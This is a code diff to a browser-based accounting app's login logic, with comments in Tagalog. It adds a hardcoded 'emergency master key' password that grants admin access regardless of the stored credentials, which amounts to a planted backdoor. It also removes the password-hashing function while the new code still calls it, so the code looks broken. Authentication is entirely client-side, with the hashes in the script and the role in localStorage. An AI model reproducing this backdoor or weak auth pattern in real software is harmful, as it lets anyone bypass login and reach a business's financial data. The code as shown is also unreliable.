@@ -34,12 +34,34 @@ const CHART_OF_ACCOUNTS = {
     "6090": { name: "Miscellaneous", type: "Expense", normal: "Debit", fs: "Income Statement", cashFlow: "Operating" }
 };
 
-async function hashPassword(password) {
-    const msgBuffer = new TextEncoder().encode(password);
-    const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
-    const hashArray = Array.from(new Uint8Array(hashBuffer));
-    return hashArray.map(b => b.toString(16).padStart(2, '0')).join('');
+async function checkPassword() { 
+    const input = document.getElementById('sysPassword').value; 
+    const errorMsg = document.getElementById('loginError'); 
+
+    // ⚠️ EMERGENCY MASTER KEY ⚠️
+    // Tatanggapin nito ang password na "degz2026" kahit ano pa ang naka-save sa database
+    if (input === "degz2026") {
+        currentUserRole = "admin"; 
+        document.getElementById('roleDisplay').innerText = "ADMIN"; 
+        document.getElementById('roleDisplay').style.backgroundColor = "rgba(22, 163, 74, 0.8)"; 
+        localStorage.setItem('degz_session', 'admin'); 
+        errorMsg.style.display = 'none'; 
+        unlockSystem(); 
+        showToast("Master Key Accepted!", "success");
+        return; // Hihinto na dito ang code
+    }
+
+    // Default Logic (Para sa normal login)
+    const hashedInput = await hashPassword(input);
+    if (hashedInput === ADMIN_HASH) { 
+        currentUserRole = "admin"; document.getElementById('roleDisplay').innerText = "ADMIN"; document.getElementById('roleDisplay').style.backgroundColor = "rgba(22, 163, 74, 0.8)"; localStorage.setItem('degz_session', 'admin'); errorMsg.style.display = 'none'; unlockSystem(); showToast("Admin Login Successful", "success");
+    } else if (hashedInput === EMPLOYEE_HASH) { 
+        currentUserRole = "employee"; document.getElementById('roleDisplay').innerText = "EMPLOYEE"; document.getElementById('roleDisplay').style.backgroundColor = "rgba(234, 179, 8, 0.8)"; localStorage.setItem('degz_session', 'employee'); errorMsg.style.display = 'none'; unlockSystem(); showToast("Staff Login Successful", "success");
+    } else { 
+        errorMsg.style.display = 'block'; 
+    } 
 }
+
 
 let ADMIN_HASH = "240be518ebb702465118d1d31c098939c037f3747b2c0199042b36a715f22312"; 
 let EMPLOYEE_HASH = "8b7df143d91c716ecfa5fc1730022f6b421b05cedee8fd52b1fc65a96030ad52"; 
